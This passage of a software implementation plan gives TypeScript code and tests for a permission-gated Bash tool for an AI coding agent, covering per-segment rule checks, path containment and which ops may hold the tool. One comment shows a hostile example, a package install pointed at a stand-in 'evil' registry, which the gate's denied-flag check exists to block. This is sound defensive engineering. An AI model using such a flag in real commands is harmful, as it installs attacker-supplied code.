    const policy = policyFor(["bun test *"], { deny: ["*"] });
    expect(policy.grantedTools()).not.toContain("Bash");
  });
});
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `bun test test/unit/tools/policy-bash.test.ts`
Expected: FAIL — `commandField` is not in `ToolScope`, so every call falls through to `pathsBranch` and is wrongly allowed.

- [ ] **Step 3: Write the evaluator**

`src/tools/policy-bash.ts`:

```typescript
/**
 * Per-segment evaluation of a model-authored Bash command (spec §4 US-005).
 *
 * Precedence, fixed and order-independent within a stage (spec R6 + US-005.3):
 *   1. the lexer's own refusal    -> deny (a payload the gate cannot read)
 *   2. ANY segment matches deny   -> deny the whole call
 *   3. EVERY segment must match an allow rule, else deny
 *   4. payload checks per segment -> DENIED_FLAGS, containment, redirects, cd
 *   5. ANY segment matches ask    -> ask
 * Ask is evaluated LAST so it can never grant: an ungranted command that
 * matches an ask rule is a plain denial, not an approval prompt (the same
 * rule the path and argv branches follow in policy.ts).
 *
 * Containment is INJECTED (`resolvePath`), not imported: `policy.ts` imports
 * this module, so importing `resolveWithin` back would be a cycle. The single
 * owner of the root boundary, the `.git/` refusal and the execTouchedPaths
 * carve-out therefore remains `policy.ts`.
 */
import { lexBashCommand } from "@/permissions";
import type { BashSegment, BashToken } from "@/permissions";
import { deniedFlag } from "./exec-guard";
import type { CompiledEntry, CompiledPattern } from "./policy-match";

export type BashCheck =
  | { readonly kind: "allow" }
  | { readonly kind: "ask"; readonly rule: string }
  | { readonly kind: "deny"; readonly reason: string; readonly breach: boolean };

export interface BashCheckArgs {
  readonly tool: string;
  readonly command: unknown;
  /** The stage's compiled ALLOW entry for this tool. */
  readonly grant: CompiledEntry;
  readonly denyEntry?: CompiledEntry;
  readonly askEntry?: CompiledEntry;
  /** Absolute resolved path, or null when the candidate escapes the root or
   * enters `.git/`. Supplied by policy.ts (see the header). */
  readonly resolvePath: (candidate: string) => string | null;
}

function deny(reason: string, breach = false): BashCheck {
  return { kind: "deny", reason, breach };
}

/**
 * Prefix match, token-wise, with the two rules Exec's `matchesArgvPattern`
 * does not have:
 *
 * - a TRAILING `*` is OPTIONAL, because the spec requires `Bash(bun test *)`
 *   to admit bare `bun test` as well as `bun test src/x.test.ts`;
 * - an OPAQUE token (one that contained `$`-expansion) is matched only by a
 *   bare `*` pattern token. A rule naming a literal must never be satisfied by
 *   a word whose runtime value this gate cannot see.
 */
function matchesTokens(patternTokens: readonly CompiledPattern[], tokens: readonly BashToken[]): boolean {
  const required =
    patternTokens.length > 0 && patternTokens[patternTokens.length - 1]?.source === "*"
      ? patternTokens.slice(0, -1)
      : patternTokens;
  if (tokens.length < required.length) return false;
  return required.every((pattern, index) => {
    const token = tokens[index] as BashToken;
    if (token.opaque && pattern.source !== "*") return false;
    return pattern.re.test(token.text);
  });
}

function matchesSegment(entry: CompiledEntry, segment: BashSegment): boolean {
  if (entry.unconditional) return true;
  return entry.argvPatterns.some((tokens) => matchesTokens(tokens, segment.tokens));
}

/** `Tool` for an unconditional entry, else `Tool(<the pattern that matched>)`. */
function ruleExpr(tool: string, entry: CompiledEntry, segment?: BashSegment): string {
  if (entry.unconditional) return tool;
  const sources = entry.raw.filter((pattern) => pattern !== "*");
  const index =
    segment === undefined ? -1 : entry.argvPatterns.findIndex((tokens) => matchesTokens(tokens, segment.tokens));
  const matched = index === -1 ? undefined : sources[index];
  return `${tool}(${matched ?? entry.raw.join(", ")})`;
}

function render(segment: BashSegment): string {
  return segment.tokens.map((token) => token.text).join(" ");
}

/**
 * Does this word address the filesystem? A conservative screen, not a guess at
 * the shell's own resolution: anything carrying a separator, the parent
 * directory, or a `~` that depends on expansion. Words with no separator are
 * binaries and flags, bounded by the rule match instead.
 */
function isPathish(text: string): boolean {
  return text.includes("/") || text === ".." || text.startsWith("~");
}

function checkPayload(args: BashCheckArgs, segment: BashSegment): BashCheck | undefined {
  const words = segment.tokens.map((token) => token.text);

  // Same list and normalizer as Exec: a prefix grant gates the verb, never the
  // payload, so `bun add x --registry https://evil` satisfies `bun add *`.
  const flag = deniedFlag(words);
  if (flag !== undefined) return deny(`flag ${flag} is not permitted in a Bash command`);

  for (const token of segment.tokens) {
    // An opaque word has no value here, so containment cannot judge it — and it
    // already cannot satisfy a literal rule token (see matchesTokens).
    if (token.opaque) continue;
    if (token.text.startsWith("~")) {
      return deny(`token "${token.text}" starts with "~", which depends on expansion this gate cannot resolve`);
    }
    if (!isPathish(token.text)) continue;
    if (args.resolvePath(token.text) === null) {
      return deny(`path "${token.text}" resolves outside the permitted root, or into .git/`, true);
    }
  }

  // `cd` moves every LATER segment's frame of reference, so its target is
  // containment-checked even when it carries no separator (`cd ..`).
  if (words[0] === "cd") {
    const target = segment.tokens[1];
    if (target === undefined) return deny("`cd` with no target is refused");
    if (target.opaque || args.resolvePath(target.text) === null) {
      return deny(`cd target "${target.text}" is not inside the permitted root`, true);
    }
  }

  for (const redirect of segment.redirects) {
    if (redirect.opaque) {
      return deny(`redirect target "${redirect.target}" depends on expansion this gate cannot resolve`);
    }
    if (args.resolvePath(redirect.target) === null) {
      return deny(`redirect target "${redirect.target}" resolves outside the permitted root`, true);
    }
  }

  return undefined;
}

export function checkBashCommand(args: BashCheckArgs): BashCheck {
  const { command, tool } = args;
  if (typeof command !== "string") return deny(`"command" must be a string`);
  if (command.trim() === "") return deny(`"command" must not be empty`);

  const lexed = lexBashCommand(command);
  if (lexed.kind === "refused") {
    return deny(
      `command contains ${lexed.construct}, which cannot be analysed and is therefore refused -- ` +
        "rewrite it without that construct, or use a structured tool",
    );
  }

  for (const segment of lexed.segments) {
    if (args.denyEntry !== undefined && matchesSegment(args.denyEntry, segment)) {
      return deny(
        `${tool} segment "${render(segment)}" is denied for this stage by rule ${ruleExpr(tool, args.denyEntry, segment)}`,
      );
    }
  }

  for (const segment of lexed.segments) {
    if (args.grant.unconditional || matchesSegment(args.grant, segment)) continue;
    const granted = args.grant.raw.filter((pattern) => pattern !== "*").join(", ");
    const alternatives = granted === "" ? "no command forms are granted for this stage" : `granted forms: ${granted}`;
    return deny(`${tool} is not granted "${render(segment)}" -- ${alternatives}`);
  }

  for (const segment of lexed.segments) {
    const refusal = checkPayload(args, segment);
    if (refusal !== undefined) return refusal;
  }

  for (const segment of lexed.segments) {
    if (args.askEntry !== undefined && matchesSegment(args.askEntry, segment)) {
      return { kind: "ask", rule: ruleExpr(tool, args.askEntry, segment) };
    }
  }

  return { kind: "allow" };
}

```

- [ ] **Step 4: Wire the branch into the policy**

In `src/tools/types.ts`, add to `ToolScope` (after `argvField`):

```typescript
  /**
   * The input field holding a model-authored shell COMMAND STRING (`Bash`).
   * A call carrying this field is evaluated per shell segment by
   * `src/tools/policy-bash.ts` rather than by the verb or path branches; a
   * tool declaring it must be granted explicitly, since no profile grants one.
   */
  readonly commandField?: string;
```

In `src/tools/policy.ts`:

```typescript
import { checkBashCommand } from "./policy-bash";
```

Extend `isFieldlessScope` (line 139) so a command-bearing scope is NOT fieldless — otherwise an unconditional `ask` rule short-circuits `check()` before the command branch ever runs:

```typescript
function isFieldlessScope(scope: ToolScope): boolean {
  return (
    scope.argvField === undefined &&
    scope.commandField === undefined &&
    scope.verbField === undefined &&
    scope.pathFields.length === 0 &&
    (scope.listPathFields?.length ?? 0) === 0 &&
    (scope.arrayPathFields?.length ?? 0) === 0 &&
    (scope.refPathFields?.length ?? 0) === 0
  );
}
```

Add the branch inside `compileToolPolicy`, beside `argvBranch`:

```typescript
  /**
   * The Bash branch. Checked entirely in policy-bash.ts and never falling
   * through: a command string is not a verb and not a path, so neither of the
   * other branches can judge it. Containment is handed over as a callback
   * because policy-bash.ts may not import this module back.
   */
  function commandBranch(
    tool: string,
    scope: ToolScope,
    input: Record<string, unknown>,
    grant: CompiledEntry,
  ): PolicyVerdict | undefined {
    if (scope.commandField === undefined) return undefined;
    const denyEntry = denyBy.get(tool);
    const askEntry = askBy.get(tool);
    const result = checkBashCommand({
      tool,
      command: input[scope.commandField],
      grant,
      ...(denyEntry !== undefined ? { denyEntry } : {}),
      ...(askEntry !== undefined ? { askEntry } : {}),
      resolvePath: (candidate) => resolveWithin(resolvedRoot, candidate, execTouchedPaths),
    });
    if (result.kind === "deny") return deny(result.reason, result.breach);
    if (result.kind === "ask") return askVerdict([], result.rule);
    return { allowed: true, resolvedPaths: [] };
  }
```

and put it first in `check()`'s chain (line ~516), because it is the only branch that can judge a command string:

```typescript
      const state: RuleState = {};
      return (
        commandBranch(tool, scope, input, grant) ??
        argvBranch(tool, scope, input, grant) ??
        verbBranch(tool, scope, input, grant, state) ??
        pathsBranch(tool, scope, input, grant, state)
      );
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `bun test test/unit/tools/policy-bash.test.ts && bun test test/unit/tools/policy.test.ts && bun test test/unit/permissions/`
Expected: PASS. The Plan A suites must stay green untouched — a change to `policy.test.ts` expectations means the branch order or `isFieldlessScope` edit changed existing behavior, which is a bug in this task, not a stale test.

- [ ] **Step 6: Check the file-size ratchet**

Run: `bun run check:file-sizes`
Expected: PASS (`policy.ts` sits at 524 lines before this task; the branch adds ~30 and the 600-line limit holds). If it fails, move `commandBranch` into `policy-bash.ts` as a function taking the compiled entries and a `resolvePath` — do NOT raise the baseline.

- [ ] **Step 7: Commit**

```bash
git add src/tools/policy-bash.ts src/tools/policy.ts src/tools/types.ts test/unit/tools/policy-bash.test.ts
git commit -m "feat(tools): per-segment Bash command evaluation in the policy"
```

---

### Task 4: the `Bash` tool and its wiring

**Files:**
- Create: `src/tools/bash.ts`
- Modify: `src/tools/index.ts` (export `createBashTool`, `_bashToolDeps`, `BASH_TIMEOUT_MS`)
- Modify: `src/agents/coding-tool-support.ts` (`shell` arg; create the tool only when DECLARED; read `quality.shell`)
- Test: `test/unit/tools/bash.test.ts`, `test/unit/agents/coding-tool-support-bash.test.ts`

**Interfaces:**
- Consumes: `runArgv` (`src/utils/argv-exec.ts` — `detached: true`, deadline, process-group SIGKILL, `stripEnvVars`); `BASH_TOOL_NAME` (Task 2); `CodingTool`/`ToolRunContext` from `./registry`.
- Produces:
  - `const BASH_TIMEOUT_MS = 300_000`
  - `const DEFAULT_BASH_SHELL = "/bin/sh"`
  - `interface BashToolOptions { readonly shell?: string; readonly stripEnvVars?: readonly string[]; readonly patterns?: readonly string[] }`
  - `const _bashToolDeps = { runArgv }`
  - `function createBashTool(opts?: BashToolOptions): CodingTool`

- [ ] **Step 1: Write the failing tests**

`test/unit/tools/bash.test.ts`:

```typescript
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { cleanupTempDir, makeTempDir } from "@test/helpers";
import { _bashToolDeps, BASH_TIMEOUT_MS, createBashTool } from "@/tools";

const realRunArgv = _bashToolDeps.runArgv;

let root: string;
let calls: Parameters<typeof realRunArgv>[0][];

function stubRunArgv(result: Partial<Awaited<ReturnType<typeof realRunArgv>>> = {}): void {
  _bashToolDeps.runArgv = async (options) => {
    calls.push(options);
    return { exitCode: 0, stdout: "out", stderr: "", timedOut: false, ...result };
  };
}

const ctx = (maxBytes = 40_000) => ({ root, resolvedPaths: [], maxBytes, maxFileBytes: 2_000_000 });

beforeEach(() => {
  root = makeTempDir("bash-tool-");
  calls = [];
});

afterEach(() => {
  _bashToolDeps.runArgv = realRunArgv;
  cleanupTempDir(root);
});

describe("createBashTool", () => {
  test("spawns the configured shell with -c and the command verbatim", async () => {
    stubRunArgv();
    const tool = createBashTool({ shell: "/bin/bash" });
    await tool.run({ command: "bun test && echo done" }, ctx());
    expect(calls[0]?.argv).toEqual(["/bin/bash", "-c", "bun test && echo done"]);
  });

  test("defaults to /bin/sh and runs in the permitted root, not the process cwd", async () => {
    stubRunArgv();
    await createBashTool().run({ command: "bun test" }, ctx());
    expect(calls[0]?.argv[0]).toBe("/bin/sh");
    expect(calls[0]?.cwd).toBe(root);
  });

  test("forwards the project's stripEnvVars", async () => {
    stubRunArgv();
    await createBashTool({ stripEnvVars: ["NPM_TOKEN"] }).run({ command: "bun test" }, ctx());
    expect(calls[0]?.stripEnvVars).toEqual(["NPM_TOKEN"]);
  });

  test("defaults the deadline to the Exec ceiling and clamps a larger request", async () => {
    stubRunArgv();
    const tool = createBashTool();
    await tool.run({ command: "bun test" }, ctx());
    expect(calls[0]?.timeoutMs).toBe(BASH_TIMEOUT_MS);
    await tool.run({ command: "bun test", timeoutMs: BASH_TIMEOUT_MS * 10 }, ctx());
    expect(calls[1]?.timeoutMs).toBe(BASH_TIMEOUT_MS);
  });

  test("honours a smaller requested deadline", async () => {
    stubRunArgv();
    await createBashTool().run({ command: "bun test", timeoutMs: 5_000 }, ctx());
    expect(calls[0]?.timeoutMs).toBe(5_000);
  });

  test("reports exit code and output, and is not an error on exit 0", async () => {
    stubRunArgv({ stdout: "hello", stderr: "" });
    const result = await createBashTool().run({ command: "echo hello" }, ctx());
    expect(result.content).toContain("exit 0");
    expect(result.content).toContain("hello");
    expect(result.isError).toBe(false);
  });

  test("a non-zero exit is an error result, not a throw", async () => {
    stubRunArgv({ exitCode: 1, stderr: "boom" });
    const result = await createBashTool().run({ command: "false" }, ctx());
    expect(result.isError).toBe(true);
    expect(result.content).toContain("boom");
  });

  test("a timeout says so and reports the deadline", async () => {
    stubRunArgv({ timedOut: true });
    const result = await createBashTool().run({ command: "sleep 999", timeoutMs: 5_000 }, ctx());
    expect(result.isError).toBe(true);
    expect(result.content).toContain("timed out after 5000ms");
  });

  test("output is capped at ctx.maxBytes and the pre-truncation size is reported", async () => {
    stubRunArgv({ stdout: "x".repeat(5_000) });
    const result = await createBashTool().run({ command: "cat big" }, ctx(100));
    expect(result.content.length).toBe(100);
    expect(result.resultBytesPreTruncation).toBeGreaterThan(5_000);
  });

  test("a missing or empty command is an input error, never a spawn", async () => {
    stubRunArgv();
    for (const input of [{}, { command: "" }, { command: "   " }, { command: 7 }]) {
      const result = await createBashTool().run(input, ctx());
      expect(result.isError).toBe(true);
    }
    expect(calls).toHaveLength(0);
  });

  test("a spawn-time throw surfaces as a tool error", async () => {
    _bashToolDeps.runArgv = () => {
      throw new Error("cwd vanished");
    };
    const result = await createBashTool().run({ command: "bun test" }, ctx());
    expect(result.isError).toBe(true);
    expect(result.content).toContain("cwd vanished");
  });

  test("the description steers to the structured tools first (spec R2)", () => {
    const description = createBashTool({ patterns: ["bun test *"] }).description;
    expect(description).toContain("bun test *");
    expect(description.toLowerCase()).toContain("prefer");
  });

  test("declares the command field so the policy uses the Bash branch", () => {
    expect(createBashTool().scope.commandField).toBe("command");
  });
});
```

`test/unit/agents/coding-tool-support-bash.test.ts`:

```typescript
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { cleanupTempDir, makeTempDir } from "@test/helpers";
import { buildCodingToolSupport } from "@/agents/coding-tool-support";

let root: string;

beforeEach(() => {
  root = makeTempDir("bash-wiring-");
});

afterEach(() => {
  cleanupTempDir(root);
});

const support = (args: Parameters<typeof buildCodingToolSupport>[0]) => buildCodingToolSupport({ root, ...args });

describe("Bash wiring", () => {
  test("declared and granted: advertised", () => {
    const built = support({
      declared: ["Read", "Bash"],
      grants: [
        { tool: "Read", patterns: ["*"] },
        { tool: "Bash", patterns: ["bun test *"] },
      ],
    });
    expect(built?.tools.map((tool) => tool.name)).toContain("Bash");
  });

  test("granted but NOT declared: never reachable (spec §6 row 11, the op ceiling)", async () => {
    const built = support({
      declared: ["Read"],
      grants: [
        { tool: "Read", patterns: ["*"] },
        { tool: "Bash", patterns: ["bun test *"] },
      ],
    });
    expect(built?.tools.map((tool) => tool.name)).not.toContain("Bash");
    const outcome = await built?.runtime.callTool("Bash", { command: "bun test" });
    expect(outcome?.kind).toBe("denied");
    if (outcome?.kind === "denied") expect(outcome.reason).toContain("unknown tool");
  });

  test("declared but NOT granted: not advertised, and denied BY THE POLICY (spec §6 rows 1-2)", async () => {
    const built = support({ declared: ["Read", "Bash"], grants: [{ tool: "Read", patterns: ["*"] }] });
    expect(built?.tools.map((tool) => tool.name)).not.toContain("Bash");
    const outcome = await built?.runtime.callTool("Bash", { command: "bun test" });
    expect(outcome?.kind).toBe("denied");
    // NOT "unknown tool": the tool exists, the grant does not. That is what
    // lets the denial carry a redirect (row 1), and it is the whole reason
    // creation is gated on declaration rather than on the grant.
    if (outcome?.kind === "denied") expect(outcome.reason).not.toContain("unknown tool");
  });

  test("the project's shell reaches the tool", () => {
    const built = support({
      declared: ["Bash"],
      grants: [{ tool: "Bash", patterns: ["*"] }],
      shell: "/bin/zsh",
    });
    expect(built?.tools.find((tool) => tool.name === "Bash")?.description).toContain("/bin/zsh");
  });
});
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `bun test test/unit/tools/bash.test.ts test/unit/agents/coding-tool-support-bash.test.ts`
Expected: FAIL — `createBashTool` is not exported; `shell` is not an accepted `buildCodingToolSupport` argument.

- [ ] **Step 3: Write the tool**

`src/tools/bash.ts`:

```typescript
/**
 * The model-authored shell tool (spec §4 US-004).
 *
 * Session-local like `RunCommand`, not a global registry entry: it needs the
 * project's shell and secret-strip list, which are per-config. Created only
 * when the operation DECLARED it (see coding-tool-support.ts) — a tool the
 * global registry held would be callable by an op that never declared it,
 * because `callTool` looks a name up before it consults advertisement.
 *
 * WHERE IT RUNS: `ctx.root`, the hop's permitted root and the same root the
 * policy resolved every path against. Never the runtime's workdir — under `-d`
 * those differ, and that difference is the #1794 defect.
 *
 * WHAT GATES IT: nothing here. The command string reached this function only
 * because `policy.check` already lexed it, matched every segment against the
 * stage's `Bash(...)` rules and containment-checked its paths and redirects
 * (src/tools/policy-bash.ts). This module must never be given a "safe enough"
 * check of its own: two gates in two places drift, and the second one is the
 * one nobody tests.
 */
import { runArgv } from "../utils/argv-exec";
import type { CodingTool } from "./registry";
import { BASH_TOOL_NAME } from "./types";

/**
 * Deadline for a Bash spawn — the same ceiling the Exec branch uses
 * (`EXEC_TIMEOUT_MS`, src/tools/run-command-exec.ts). A model-authored command
 * may legitimately be a build or a full test run, and a shorter default would
 * be worked around rather than respected.
 */
export const BASH_TIMEOUT_MS = 300_000;

/** Floor for a caller-requested deadline: below this, a real command cannot
 * even start, and a 0 would disable the deadline entirely. */
const MIN_BASH_TIMEOUT_MS = 1_000;

export const DEFAULT_BASH_SHELL = "/bin/sh";

export interface BashToolOptions {
  /** `quality.shell`. */
  readonly shell?: string;
  /** `quality.stripEnvVars` — secrets removed before the spawn. */
  readonly stripEnvVars?: readonly string[];
  /** The stage's granted patterns, for the DESCRIPTION only. The policy is the
   * gate; naming the granted forms here is what stops the model spending a
   * turn discovering them by denial. */
  readonly patterns?: readonly string[];
}

/** Injectable seam, mirroring `_argvExecDeps` / `_gitToolDeps`. */
export const _bashToolDeps = { runArgv };

function describeGrants(patterns: readonly string[] | undefined): string {
  const named = (patterns ?? []).filter((pattern) => pattern !== "*");
  if (patterns?.includes("*") === true) return "every command form is granted for this stage";
  if (named.length === 0) return "no command forms are granted for this stage";
  return `granted command forms: ${named.join(", ")}`;
}

export function createBashTool(opts: BashToolOptions = {}): CodingTool {
  const shell = opts.shell ?? DEFAULT_BASH_SHELL;
  return {
    name: BASH_TOOL_NAME,
    // A non-zero exit from a command the model wrote is its own red/green loop,
    // not a fault worth an operator's attention — the same reason RunCommand
    // sets this.
    routineErrors: true,
    description:
      `Run one shell command string under ${shell}. PREFER the structured tools when they express the task -- ` +
      "Read, Glob, Grep, Git and RunCommand return bounded, parseable output, and Bash exists for what they cannot express. " +
      `${describeGrants(opts.patterns)}; anything else is refused. ` +
      "Each segment of a `&&`/`||`/`;`/`|` chain is checked separately, and command substitution ($(...), backticks), " +
      "process substitution, here-documents and `2>&1` are refused outright because they cannot be analysed. " +
      "Paths and redirect targets must stay inside the repository root.",
    inputSchema: {
      type: "object",
      properties: {
        command: { type: "string", description: "The shell command to run, e.g. \"bun test src/a.test.ts\"" },
        timeoutMs: {
          type: "number",
          description: `Deadline in milliseconds (default and maximum ${BASH_TIMEOUT_MS}).`,
        },
        description: { type: "string", description: "One short line on what this command is for." },
      },
      required: ["command"],
    },
    // `commandField` is what routes this call to the Bash branch of the policy
    // (src/tools/policy-bash.ts). No pathFields: the paths are inside the
    // command string, where only that branch can see them.
    scope: { pathFields: [], commandField: "command" },

    async run(input, ctx) {
      const command = input.command;
      if (typeof command !== "string" || command.trim() === "") {
        return { content: '"command" must be a non-empty string', isError: true };
      }
      const requested = typeof input.timeoutMs === "number" && Number.isFinite(input.timeoutMs) ? input.timeoutMs : BASH_TIMEOUT_MS;
      const timeoutMs = Math.min(Math.max(Math.trunc(requested), MIN_BASH_TIMEOUT_MS), BASH_TIMEOUT_MS);
      const argv = [shell, "-c", command];

      try {
        const result = await _bashToolDeps.runArgv({
          argv,
          cwd: ctx.root,
          timeoutMs,
          stripEnvVars: [...(opts.stripEnvVars ?? [])],
        });
        const body = result.timedOut
          ? `timed out after ${timeoutMs}ms`
          : `exit ${result.exitCode}\n${result.stdout}\n${result.stderr}`;
        return {
          content: body.slice(0, ctx.maxBytes),
          isError: result.timedOut || result.exitCode !== 0,
          // The ledger records what actually ran, not what was requested.
          audit: { executed: argv },
          resultBytesPreTruncation: Buffer.byteLength(body, "utf8"),
        };
      } catch (err) {
        // A spawn-time failure (an unresolvable cwd, a missing shell) rejects
        // rather than resolving with an exit code; surfaced as an ordinary tool
        // error so it is indistinguishable from any other refusal above.
        return { content: err instanceof Error ? err.message : String(err), isError: true };
      }
    },
  };
}
```

Export from `src/tools/index.ts`:

```typescript
export { _bashToolDeps, BASH_TIMEOUT_MS, createBashTool, DEFAULT_BASH_SHELL } from "./bash";
```

- [ ] **Step 4: Wire it into the dispatch seam**

In `src/agents/coding-tool-support.ts`:

1. Import `BASH_TOOL_NAME` and `createBashTool` from `@/tools`.
2. Add to `buildCodingToolSupport`'s args:

```typescript
  /** `quality.shell` — the shell the Bash tool spawns. Defaults to /bin/sh. */
  shell?: string;
```

3. Beside the `execGrant` line (:97 on `3accdbd6f`), resolve the Bash grant the same way — `findLast`, because the allow compiler is last-write-wins per tool:

```typescript
  // Gated on DECLARATION ALONE — deliberately not on the grant.
  //
  // Declaration is the ceiling: a tool the runtime can LOOK UP is callable even
  // when `advertised()` never returned it (callTool resolves the name before it
  // consults advertisement), so a stage that grants Bash must not hand it to a
  // reviewer op that never declared it (spec §6 row 11).
  //
  // But an op that DID declare it and holds no grant must be refused by the
  // POLICY, not by a failed name lookup: "unknown tool" carries no redirect,
  // and spec §6 row 1 requires the ungranted case to offer an alternative. So
  // the tool is constructed either way; with no grant, `grantedTools()` still
  // excludes it (never advertised, no schema cost in the prompt) and the call
  // denies through `policy.check`, which is where a redirect is computed.
  const bashGrant = grants.findLast((grant) => grant.tool === BASH_TOOL_NAME);
  const allowBash = args.declared.includes(BASH_TOOL_NAME);
```

4. Add the tool to `extraTools`, alongside the `createRunCommandTool` entry:

```typescript
      ...(allowBash
        ? [
            createBashTool({
              ...(args.shell !== undefined ? { shell: args.shell } : {}),
              ...(args.stripEnvVars !== undefined ? { stripEnvVars: args.stripEnvVars } : {}),
              // The compiled grant, so the description names what THIS stage
              // may run rather than a generic sentence.
              patterns: bashGrant?.patterns ?? [],
            }),
          ]
        : []),
```

5. In `resolveCodingToolSupport`, widen the local config read to include the shell and pass it through:

```typescript
        quality?: { commands?: Partial<Record<string, QualityCommandSpec>>; stripEnvVars?: unknown; shell?: unknown };
```

```typescript
  const shell = typeof quality?.shell === "string" ? quality.shell : undefined;
```

and in the `buildCodingToolSupport({...})` call:

```typescript
    ...(shell !== undefined ? { shell } : {}),
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `bun test test/unit/tools/bash.test.ts test/unit/agents/ test/unit/tools/runtime.test.ts`
Expected: PASS.

- [ ] **Step 6: Note for the reviewer — the process-group kill is NOT re-tested here**

`runArgv` already carries `detached: true` and `killProcessGroup(pid, "SIGKILL")` on the deadline (`src/utils/argv-exec.ts`, defects MEM-4 and BUG-13), with its own tests. This task asserts that Bash passes the right `timeoutMs` through that seam. Do **not** add a test that spawns a real long-running process and waits for the kill: a fixed-duration wait is banned by the repo's testing rules, and re-testing `runArgv` here would duplicate coverage while proving nothing new about Bash.

- [ ] **Step 7: Commit**

```bash
git add src/tools/bash.ts src/tools/index.ts src/agents/coding-tool-support.ts test/unit/tools/bash.test.ts test/unit/agents/coding-tool-support-bash.test.ts
git commit -m "feat(tools): add the Bash tool, created only where an op declares it"
```

---

### Task 5: op declarations — who may ever hold Bash

**Ruling (user, 2026-09-14): the verifier does NOT declare Bash.** The spec's US-004
ceiling lists it; that is overridden here. `verify.ts` deliberately carries no `Exec`
because a verifier must not be able to install packages, and a `Bash(...)` rule
permitting `bun add *` would route straight around that — a wider hole than the one
the missing `Exec` closes. Nine fix-shaped ops declare it; the verifier is pinned
NEGATIVE alongside the review ops, so a later hand cannot quietly add it back.

**Files:**
- Modify: `src/operations/implement.ts:46-58`, `src/operations/write-test.ts:69-81`, `src/operations/rectify.ts:23-35`, `src/operations/autofix-implementer.ts:33-45`, `src/operations/autofix-test-writer.ts:30-42`, `src/operations/acceptance-fix.ts:34` and `:66`, `src/operations/finish-fix.ts:38`, `src/operations/full-suite-rectify-op.ts:41`
- Test: `test/unit/operations/bash-declarations.test.ts`

**Interfaces:**
- Consumes: `BASH_TOOL_NAME`'s string value `"Bash"` as a `CodingToolName` literal (Task 2 added it to the union, so these arrays type-check).
- Produces: nothing new; this task changes declarations only.

- [ ] **Step 1: Write the failing test**

`test/unit/operations/bash-declarations.test.ts`:

```typescript
/**
 * Who may ever hold Bash (spec §4 US-004's ceiling).
 *
 * Declaration is the CEILING, not a grant: every op below still gets zero Bash
 * unless a human wrote a `Bash(...)` allow rule (spec R4). Review ops are
 * excluded in v1 — a reviewer that can run arbitrary commands is no longer
 * judging the work from the outside.
 */
import { describe, expect, test } from "bun:test";
import {
  acceptanceFixSourceOp,
  acceptanceFixTestOp,
  adversarialReviewOp,
  planDebaterOp,
  finishFixOp,
  fullSuiteRectifyOp,
  implementerOp,
  implementerRectifyOp,
  planInteractiveOp,
  rectifyOp,
  semanticReviewOp,
  testWriterOp,
  testWriterRectifyOp,
  verifierOp,
} from "@/operations";

// The verifier is imported to be pinned NEGATIVE (see the ruling in this task's
// header), not because it holds Bash.

describe("ops that may hold Bash", () => {
  test.each([
    ["implementer", implementerOp],
    ["write-test", testWriterOp],
    ["rectify", rectifyOp],
    ["autofix-implementer", implementerRectifyOp],
    ["autofix-test-writer", testWriterRectifyOp],
    ["acceptance-fix-source", acceptanceFixSourceOp],
    ["acceptance-fix-test", acceptanceFixTestOp],
    ["finish-fix", finishFixOp],
    ["full-suite-rectify", fullSuiteRectifyOp],
  ] as const)("%s declares Bash", (_name, op) => {
    expect(op.tools).toContain("Bash");
  });
});

describe("ops that must never hold Bash", () => {
  test.each([
    ["adversarial-review", adversarialReviewOp],
    ["semantic-review", semanticReviewOp],
    ["debate-plan", planDebaterOp],
    ["plan", planInteractiveOp],
    // The verifier judges the implementer's work. It already cannot install
    // (no `Exec` — see test/unit/operations/op-tool-declarations.test.ts), and
    // a Bash rule covering `bun add *` would hand back exactly that ability.
    // Ruled out by the user on 2026-09-14, overriding the spec's US-004 list.
    ["verifier", verifierOp],
  ] as const)("%s does not declare Bash", (_name, op) => {
    expect(op.tools ?? []).not.toContain("Bash");
  });
});
```

If an export name above does not exist under that identifier, resolve the real one from `src/operations/index.ts` (the barrel is what dispatch reads) rather than importing the module file.

- [ ] **Step 2: Run the test to verify it fails**

Run: `bun test test/unit/operations/bash-declarations.test.ts`
Expected: FAIL — no op declares `"Bash"` yet.

- [ ] **Step 3: Add the declaration**

Add `"Bash"` to each of the nine `tools:` arrays, immediately after `"Exec"`. Do **not** touch `src/operations/verify.ts` (see this task's ruling). Example, `src/operations/implement.ts`:

```typescript
  tools: [
    "Read",
    "Glob",
    "Grep",
    "Write",
    "Edit",
    "Delete",
    "Git",
    "RunCommand",
    "GitCommit",
    "Exec",
    "Bash",
    "RequestCapability",
  ],
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `bun test test/unit/operations/`
Expected: PASS. The existing `tool-declarations.test.ts` and `op-tool-declarations.test.ts` use `toContain`, so an added name cannot break them.

- [ ] **Step 5: Run the op-capability gate**

Run: `bun run check:op-tool-capability`
Expected: PASS with no baseline change (`scripts/baselines/op-tool-capability-baseline.json` lists zero ops; the gate asserts REQUIRED ⊆ declared, so adding a tool cannot violate it). Do not run `--update-baseline`.

- [ ] **Step 6: Commit**

```bash
git add src/operations/ test/unit/operations/bash-declarations.test.ts
git commit -m "feat(operations): declare Bash on the fix roles only"
```

---

### Task 6: `Mcp(...)` grammar and MCP tools under `scoped`

**Files:**
- Modify: `src/config/config-guards.ts:349` (known-name set + `Mcp(...)` pattern validation)
- Modify: `src/tools/provider-grants.ts` (the `Mcp` partition/admit/expand helpers)
- Modify: `src/tools/provider-advertise.ts:16-56` (`admits` option; return `entries`)
- Modify: `src/config/permissions.ts` (`ResolvedPermissions.providerScope`)
- Modify: `src/agents/coding-tool-support.ts:282-325` (consume `providerScope`; partition and expand)
- Test: `test/unit/tools/mcp-rules.test.ts`, `test/unit/agents/mcp-under-scoped.test.ts`, `test/unit/config/mcp-expression-validation.test.ts`

**Interfaces:**
- Consumes: `MCP_SERVER_ID_RE` (`src/config/schemas-mcp.ts:15`); `namespacedToolName` (`src/tools/provider-adapt.ts:14`); `expandProviderGrants` (`src/tools/provider-grants.ts:19`).
- Produces:
  - `const MCP_RULE_TOOL = "Mcp"` (`src/tools/provider-grants.ts`)
  - `function partitionMcpRules(grants: readonly ToolGrant[]): { readonly grants: readonly ToolGrant[]; readonly mcpPatterns: readonly string[] }`
  - `function mcpRuleAdmits(patterns: readonly string[], providerId: string, localName: string): boolean`
